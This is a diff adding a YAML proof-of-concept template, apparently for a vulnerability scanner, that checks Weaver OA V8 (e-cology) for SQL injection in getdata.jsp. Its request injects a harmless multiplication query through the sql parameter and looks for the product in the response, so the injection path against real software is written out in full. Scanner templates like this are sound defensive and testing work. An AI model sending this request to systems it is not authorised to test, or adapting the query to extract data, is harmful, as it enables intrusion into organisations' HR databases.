@@ -1,0 +1,18 @@
+id: poc-yaml-weaver-oa-v8-sqli
+info:
+  name: 泛微OA V8 getdata.jsp SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: e-cology
+  osprey-id: vb_2021_0031
+  reference: []
+  description: null
+variables:
+  r1: random_int(111111, 999999)
+  r2: random_int(111111, 999999)
+transport: http
+requests:
+- method: GET
+  path: /js/hrm/getdata.jsp?cmd=getSelectAllId&sql=select%20{{.r1}}*{{.r2}}%20as%20id%20from%20HrmResourceManager
+  expression: status_code == 200 && contains(body,r1*r2)
